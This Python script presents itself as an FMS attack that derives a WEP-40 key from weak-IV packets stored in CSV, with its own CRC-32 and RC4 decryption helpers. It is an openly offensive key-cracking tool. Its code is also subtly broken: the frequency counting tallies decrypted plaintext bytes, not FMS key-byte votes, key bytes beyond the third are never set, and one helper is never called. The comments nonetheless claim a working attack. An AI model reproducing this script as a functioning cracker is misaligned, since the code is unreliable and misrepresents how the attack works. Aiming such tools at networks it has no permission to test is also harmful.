import csv
import struct
import rc4  # Assuming you have the RC4 implementation in rc4.py

# Constants
WEP_KEY_SIZE = 5  # WEP-40 key size (5 bytes)
WEP_CRC_SIZE = 4  # 4 bytes for CRC
WEP_PAYLOAD_SIZE = 100  # Adjusted payload size as needed


def calculate_crc(data):
    """Calculates CRC-32 for the given data."""
    crc = 0xffffffff
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xedb88320
            else:
                crc >>= 1
    return crc ^ 0xffffffff


def decrypt_with_key(packet, key):
    """Decrypts the payload of the packet using the given WEP key."""
    weak_iv = packet[:3]  # Weak IV is the first 3 bytes
    encrypted_payload = packet[3:-WEP_CRC_SIZE]  # Payload excluding CRC
    expected_crc = struct.unpack("<I", packet[-WEP_CRC_SIZE:])[0]  # Extract expected CRC

    # Prepare RC4 for decryption
    decrypted_payload = rc4.encrypt_decrypt_payload(encrypted_payload, key)

    # Calculate CRC for the decrypted payload
    crc = calculate_crc(decrypted_payload)

    # Check if the calculated CRC matches the expected CRC
    return crc == expected_crc


def derive_key_from_csv(file_path):
    """Reads the CSV file and attempts to derive the WEP key using the FMS attack."""
    weak_iv_packets = []

    # Read the CSV file
    with open(file_path, 'r') as csvfile:
        csv_reader = csv.reader(csvfile)
        next(csv_reader)  # Skip header
        for row in csv_reader:
            weak_iv = bytes(int(x, 16) for x in row[0].split(','))
            snap_header = bytes(int(x, 16) for x in row[1].split(','))
            encrypted_payload = bytes(int(x, 16) for x in row[2].split(','))
            crc = int(row[3], 16)

            # Reconstruct the packet
            packet = weak_iv + snap_header + encrypted_payload + struct.pack("<I", crc)
            weak_iv_packets.append(packet)

    # List to hold potential key byte frequencies for each position
    key_byte_frequencies = [[0] * 256 for _ in range(WEP_KEY_SIZE)]

    # Iterate through weak IV packets to collect frequencies
    for packet in weak_iv_packets:
        weak_iv = packet[:3]

        # Collect potential key byte frequencies based on weak IVs
        for k in range(256):  # Iterate over all possible byte values
            key_candidate = bytearray(WEP_KEY_SIZE)

            # For the first byte of the key, derive from weak IV
            key_candidate[0] = weak_iv[0] ^ k

            # Decrypt and check payloads based on the derived key candidate
            decrypted_payload = rc4.encrypt_decrypt_payload(packet[3:-WEP_CRC_SIZE], key_candidate)

            # Update frequency count for the decrypted byte (if valid)
            if len(decrypted_payload) > 0:
                key_byte_frequencies[0][decrypted_payload[0]] += 1

            # Derive additional bytes of the key
            for byte_index in range(1, WEP_KEY_SIZE):
                if byte_index < len(weak_iv):  # Ensure we are within bounds
                    key_candidate[byte_index] = weak_iv[byte_index] ^ k
                    decrypted_payload = rc4.encrypt_decrypt_payload(packet[3:-WEP_CRC_SIZE], key_candidate)

                    # Update frequency count for the decrypted byte (if valid)
                    if len(decrypted_payload) > byte_index:
                        key_byte_frequencies[byte_index][decrypted_payload[byte_index]] += 1

    # Derive the key by selecting the most frequent byte for each position
    derived_key = bytearray(WEP_KEY_SIZE)
    for i in range(WEP_KEY_SIZE):
        # Select the byte with the highest frequency for each key position
        derived_key[i] = key_byte_frequencies[i].index(max(key_byte_frequencies[i]))

    return derived_key


# Example usage
if __name__ == "__main__":
    input_file = "weak_iv_packets.csv"  # Input CSV file containing weak IV packets
    derived_key = derive_key_from_csv(input_file)

    if derived_key:
        print(f"Derived WEP key: {derived_key.hex()}")
    else:
        print("Failed to derive the WEP key.")
